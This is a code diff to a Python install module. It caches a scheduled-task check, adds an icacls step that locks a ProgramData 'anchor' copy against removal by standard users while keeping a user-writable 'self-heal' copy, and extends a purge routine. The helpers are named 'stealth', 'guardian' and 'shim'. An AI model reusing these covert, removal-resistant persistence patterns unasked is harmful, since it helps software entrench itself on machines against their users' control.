@@ -387,16 +387,62 @@ def _write_scheduled_task(launcher: str) -> str:
         return ""
 
 
+_task_cache: bool = False
+_task_cache_ts: float = 0.0
+
+
 def _task_exists() -> bool:
+    global _task_cache, _task_cache_ts
     from .. import config
+    now = time.time()
+    if now - _task_cache_ts < 30.0:
+        return _task_cache
     try:
         result = subprocess.run(
             ["schtasks", "/Query", "/TN", config.TASK_NAME],
             capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=20,
         )
-        return result.returncode == 0
+        _task_cache = (result.returncode == 0)
+        _task_cache_ts = now
+        return _task_cache
     except Exception:
         return False
+
+
+def _harden_acl() -> list[str]:
+    """Asymmetric ACL policy:
+    Primary (LOCALAPPDATA): user-writable (M) so unelevated self-heal works.
+    Anchor (PROGRAMDATA): read/execute ONLY (RX) for standard users.
+    """
+    if not IS_WINDOWS or not stealth.is_admin():
+        return []
+    done = []
+    primary = stealth.primary_directory()
+    if os.path.isdir(primary):
+        try:
+            subprocess.run(
+                f'icacls "{primary}" /grant *S-1-5-32-545:(OI)(CI)(M) '
+                f'/grant *S-1-5-18:(OI)(CI)(F) /grant *S-1-5-32-544:(OI)(CI)(F) /T /C /Q',
+                shell=True, capture_output=True, timeout=60,
+                creationflags=CREATE_NO_WINDOW,
+            )
+            done.append(f"acl primary {primary}")
+        except Exception:
+            pass
+
+    anchor = stealth.anchor_directory()
+    if os.path.isdir(anchor) and os.path.abspath(anchor) != os.path.abspath(primary):
+        try:
+            subprocess.run(
+                f'icacls "{anchor}" /grant *S-1-5-32-545:(OI)(CI)(RX) '
+                f'/grant *S-1-5-18:(OI)(CI)(F) /grant *S-1-5-32-544:(OI)(CI)(F) /T /C /Q',
+                shell=True, capture_output=True, timeout=60,
+                creationflags=CREATE_NO_WINDOW,
+            )
+            done.append(f"acl anchor {anchor}")
+        except Exception:
+            pass
+    return done
 
 
 # --------------------------------------------------------------------------
@@ -459,6 +505,7 @@ def install() -> list[str]:
         if _write_scheduled_task(launcher):
             actions.append("scheduled task")
         actions += guardian.install()
+        actions += _harden_acl()
     else:
         actions.append(_write_unix_autostart(launcher))
         cron = _write_cron(launcher)
@@ -766,10 +813,15 @@ def status() -> dict[str, object]:
 
 
 def purge() -> list[str]:
-    """Complete wipe including HKLM values, program data copies and runtime."""
-    removed = remove()
+    """Hard removal: everything, including the %PROGRAMDATA% anchor and runtime."""
+    removed = remove(keep_anchor=False)
     if IS_WINDOWS:
-        for p in (stealth.shim_path(), stealth.kit_cache_path(),
+        removed += guardian.remove()
+        anchor = stealth.anchor_directory()
+        if os.path.isdir(anchor):
+            shutil.rmtree(anchor, ignore_errors=True)
+            removed.append(f"removed anchor {anchor}")
+        for p in (stealth.shim_path(), stealth.anchor_shim_path(), stealth.kit_cache_path(),
                   os.path.join(stealth.primary_directory(), "deploy.json"),
                   os.path.join(stealth.primary_directory(), "runtime")):
             if os.path.exists(p):
